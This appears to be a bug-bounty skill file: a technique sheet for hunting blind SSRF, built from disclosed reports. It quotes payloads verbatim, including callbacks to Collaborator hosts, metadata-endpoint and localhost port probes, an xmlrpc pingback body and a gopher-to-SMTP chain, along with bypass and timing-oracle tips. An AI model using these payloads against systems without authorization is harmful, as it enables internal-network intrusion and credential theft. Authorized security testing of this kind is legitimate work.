---
name: hunter-l3-blind-ssrf
description: "Use when hunting Blind SSRF on a target. Loads the L3 technique sheet: Blind SSRF is the class of bugs where the server makes an outbound request to a destination the attacker controls or influences, but the attacker never directly sees the response body."
domain: cybersecurity
subdomain: web
tags:
- web
- blind-ssrf
- hunting
- l3
version: '1.0'
---

# Blind SSRF — Technique Sheet

## Overview

Blind SSRF is the class of bugs where the server makes an outbound request to a destination the attacker controls or influences, but the attacker never directly sees the response body. Detection and impact ride on out-of-band callbacks (Burp Collaborator / interactsh / attacker VPS) and on differential signals — reflected error messages, response timing, and status codes — to probe internal hosts, ports, and cloud metadata endpoints. It pays on any feature that takes a URL, address, or host/endpoint input and fetches it server-side: webhooks, "probe"/"check URL" actions, payment/lead forms, XML-RPC pingback, release-upload forms that follow links, Sentry source scraping, oembed fetchers, and raw-HTTP proxy endpoints. Even without data exfiltration, confirmed internal reachability (port scanning, metadata access, SMTP interaction) has been accepted and paid across TikTok, Acronis, Elastic, Cloudflare, EXNESS, DoD, Nextcloud, Node.js third-party modules, and GSA.

## Distinct sub-patterns

### 1. Unauthenticated AJAX form fields used to build a server-side request
- Endpoint shape: `POST /wp-admin/admin-ajax.php` (WordPress AJAX action; here a payment-creation action). Parameters: `address`, `company`.
- Payload (verbatim): `address=http%3a%2f%2fjczo3ewu8jpfgyiajmkacspsnjtbh0.burpcollaborator.net/ssrf`
- Root cause: the `address`/`company` parameters in the payment-creation AJAX action are used to build a server-side HTTP request with no validation of the destination. Critically, the action required no authentication.
- Impact proven: an unauthenticated attacker caused the Acronis server (109.123.216.85) to make an HTTP callback to a Burp Collaborator URL; the server could be made to reach internal or external URLs (blind SSRF, network amplification).
- Exemplars: id=1086206 (Acronis).

### 2. Raw-HTTP proxy endpoint as a port scanner (timing + status differential)
- Endpoint shape: `GET /api/v1/http/default/raw?url=<target>&regex=<pattern>&statusCodeMin=<n>&statusCodeMax=<n>` — an HTTP-RAW fetch endpoint in Elastic's APM agent config tooling.
- Payload (verbatim): `GET /api/v1/http/default/raw?regex=%22service.name%22:/s*%22(package-registry)%22&statusCodeMax=200&statusCodeMin=200&url=http://p8yfvg6nige7z2ndagpf3v181z7pve.burpcollaborator.net:22`
- Root cause: the endpoint makes server-side requests to attacker-supplied URLs with no destination restriction. Port state leaks through the response: closed ports → "timeout/host unreachable"; open ports → a FAILURE response that contains the remote body.
- Impact proven: reconnaissance/port scanning — port 22 on the Collaborator host returned timeout/host-unreachable, while port 80 returned a FAILURE containing the remote body, proving port reachability by response differences.
- Exemplars: id=1300585 (Elastic).

### 3. Misconfigured third-party feature (Sentry source-code scraping)
- Endpoint shape: platform.dash.cloudflare.com via a Sentry integration with the source-code-scraping feature enabled (not a direct URL parameter — the feature itself issues server-side requests to arbitrary endpoints).
- Payload: not stated (no specific payload disclosed).
- Root cause: Sentry was misconfigured with source-code scraping enabled, causing server-side requests to arbitrary endpoints from Cloudflare's infrastructure. This is a configuration-driven SSRF: hunting the vendor's third-party/auxiliary infrastructure, not the app's URL parameters.
- Impact proven: confirmed blind SSRF — requests sent to arbitrary endpoints using Cloudflare infrastructure; the feature was disabled and fixed by engineering.
- Exemplars: id=1467044 (Cloudflare Public Bug Bounty).

### 4. "Probe"/webhook-verification endpoint with reflected error messages
- Endpoint shape: `POST https://my.exnessaffiliates.com/api/partner_integrations/template/probe` with JSON body parameter `url`.
- Payload (verbatim): `{"data":{"url":"https://127.0.0.1:80"}}`
- Root cause: the probe endpoint fetches an attacker-supplied URL server-side, and Python request errors are reflected back to the user. The reflected error text distinguishes open vs. closed ports.
- Impact proven: the server made DNS and HTTP requests to an attacker-controlled domain, and internal port reachability was enumerable — open port 80 on 127.0.0.1 detected via the reflected error — enabling internal network device enumeration.
- Exemplars: id=1832494 (EXNESS).

### 5. WordPress xmlrpc.php pingback.ping (unauthenticated, classic)
- Endpoint shape: `POST /xmlrpc.php` with a pingback methodCall.
- Payload (verbatim):
  `<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://your server</string></value></param><param><value><string>https://█████/</string></value></param></params></methodCall>`
  (first param = source URL = your listener; second = target post on the victim).
- Root cause: `pingback.ping` allows unauthenticated server-side requests to arbitrary URLs — WordPress core behavior, not a plugin bug. The "source" URL is fetched server-side to verify the link.
- Impact proven: POST to xmlrpc.php triggered a request to the attacker's interactsh VPS listener, confirming blind SSRF; can be used to reach internal systems.
- Exemplars: id=1890719 (U.S. Dept of Defense).

### 6. Upload/release forms that follow user-supplied URLs
- Endpoint shape: Appstore Release Upload Form (apps.nextcloud.com) — the form follows URLs supplied by the user (payload not stated as a parameter, but the payload used was `http://169.254.169.254/latest/meta-data/`).
- Payload (verbatim): `http://169.254.169.254/latest/meta-data/`
- Root cause: the form follows user-supplied URLs without server-side access restriction — no blocklist for link-local/cloud metadata addresses.
- Impact proven: blind SSRF confirmed; no real access happened (no data exfiltrated). Worth noting: the metadata IP target was accepted as the demonstration.
- Exemplars: id=2925666 (Nextcloud).

### 7. oembed / content-preview fetchers fetching internal URLs
- Endpoint shape: `POST` to an oembed endpoint (Ghost, in the Node.js third-party modules program). No named parameter; the URL is supplied in the oembed flow.
- Payload (verbatim): `http://127.0.0.1:22/`
- Root cause: the Ghost oembed handler made outbound requests to attacker-controlled URLs without blocking internal addresses. Notably, this was a limited bypass of a prior fix (report #793704) — a re-entry after initial remediation was incomplete.
- Impact proven: blind SSRF allowed internal port scanning and reading oembed contents from the internal network.
- Exemplars: id=815084 (Node.js third-party modules).

### 8. Overexposed controller route → internal protocol smuggling via gopher://
- Endpoint shape: `GET /dashboard/Campaign/json_status/{param}` — a controller route mapping arbitrary public functions to the URL path. Parameters: `status`, `real_url`, `component` (the path segment populates `$real_url`).
- Payload (verbatim): `GET /dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A25` (i.e. `gopher://127.0.0.1:25` as the `real_url` path value).
- Root cause: the framework's routing maps arbitrary public controller functions to the URL path, so `json_status()` is callable directly with an attacker-controlled `$real_url` used to make requests from the server — including non-HTTP schemes.
- Impact proven: the server issued an SMTP request to the attacker's server (data received: `MAIL FROM` / `RCPT TO kontakt@deepsec.pl`), and open/closed internal ports were mapped by response timing (port 443 open → 504; port 4445 closed → 163 ms).
- Exemplars: id=895696 (GSA Bounty). Chain used (verbatim steps): ["call json_status directly via route", "point $real_url to attacker redirect (o.php)", "chain to gopher://127.0.0.1:25 to send SMTP data"].

### 9. Undisclosed-input SSRF on ad-tech infrastructure
- Endpoint shape: ads.tiktok.com, undisclosed endpoint.
- Payload: not stated; details not disclosed.
- Root cause: server makes outbound requests based on attacker-controlled input without sufficient validation (details not disclosed).
- Impact proven: blind SSRF confirmed on ads.tiktok.com and remediated per program summary; no data exfiltration documented. Included to show that even with no disclosure, blind SSRF on high-value ad/infra domains pays.
- Exemplars: id=1006599 (TikTok).

## Bypass / chain notes

- Timing as an oracle (id=895696, id=1300585): open port → connection accepted, response delayed or 504; closed port → fast refusal (~163 ms) or "timeout/host unreachable". Compare across ports to map the internal surface. Run multiple probes to defeat jitter.
- Reflected error oracle (id=1832494): Python request exceptions reflected to the user leak port state — probe `https://127.0.0.1:<port>` and read the error text.
- Attacker-controlled redirect as a pivot (id=895696): point `$real_url` at your own redirect script (o.php); the server follows it, letting you swap targets mid-flight (e.g. into `gopher://127.0.0.1:25`).
- gopher:// for full protocol control (id=895696): when the fetcher honors gopher, you control raw bytes sent to internal services — demonstrated by injecting SMTP commands and receiving `MAIL FROM` / `RCPT TO` data back. Targets: SMTP (25), and by extension any line-oriented internal service.
- Metadata endpoint targeting (id=2925666): `http://169.254.169.254/latest/meta-data/` through a form that follows URLs — direct reach toward cloud instance credentials/identity even without confirmed exfil.
- Bypassing a prior fix (id=815084): the Ghost oembed case was a "limited bypass" of an earlier SSRF fix (#793704). Re-test already-patched features with new entry points or endpoints — partial remediations are common.
- Third-party feature config as an SSRF source (id=1467044): when a SaaS integration (e.g. Sentry) is configured to fetch your code/endpoints, the vendor's infrastructure becomes your SSRF proxy — no URL parameter needed.
- Post-fix follow-up on oembed flows (id=815084): blocked schemes/internal IPs in one path didn't cover the oembed fetcher; enumerate every server-side fetch feature independently.

## Gotchas / what NOT to do

- Don't assume you need the body: every confirmed finding here used only the callback, reflected errors, or timing — blind SSRF is reportable without exfiltration (id=1086206, id=1890719, id=1006599 all had no data exfiltration documented and were still remediated/accepted).
- Don't exfiltrate to prove it: id=2925666 explicitly notes "no real access happened (no data exfiltrated)" — reaching 169.254.169.254 was enough. Stop at demonstration.
- Don't ignore error reflectors: if the app echoes request exceptions (id=1832494), it converts blind SSRF into a semi-confirmed scanner — test error visibility before settling for pure OOB.
- Don't forget unauthenticated WordPress surfaces: /xmlrpc.php with pingback.ping (id=1890719) needs no credentials and no special payload encoding — always check it on WP targets.
- Don't probe only HTTP: gopher (id=895696) and non-HTTP ports (22, 25, 4445) were part of confirmed findings; the fetcher's scheme support defines your reach.
- Don't trust one response: port-state inference needs the closed-port baseline (fast refusal) vs. open-port signature (slow/504/body-in-failure) — as in id=895696 and id=1300585.
- Don't stop at the first fix: re-test patched features via alternate fetch paths (id=815084 bypassing #793704).

## Real-world impact examples

- id=895696 (GSA): full SMTP injection into 127.0.0.1:25 via gopher — attacker received `MAIL FROM` / `RCPT TO kontakt@deepsec.pl` from the government server — plus a timing-based internal port map (443 open → 504; 4445 closed → 163 ms).
- id=1832444/1832494 (EXNESS): internal host/port enumeration via reflected Python errors — open port 80 on 127.0.0.1 confirmed — enabling internal network device enumeration from an unauthenticated probe endpoint.
- id=1300585 (Elastic): port reachability proven against an external target by differential responses (port 22 timeout vs. port 80 body-bearing FAILURE) using a legitimate raw-HTTP endpoint.
- id=1467044 (Cloudflare): arbitrary-endpoint requests originating from Cloudflare infrastructure via Sentry scraping — high-trust IP space abused as an SSRF proxy.
- id=1086206 (Acronis): unauthenticated Collaborator callback from the payment server (109.123.216.85) via AJAX form fields.
- id=1890719 (DoD): unauthenticated blind SSRF on a .mil WordPress instance via xmlrpc.php pingback, verified on a self-hosted interactsh listener.
- id=2925666 (Nextcloud): instance metadata endpoint (169.254.169.254) reached through the appstore release upload form; stopped at demonstration.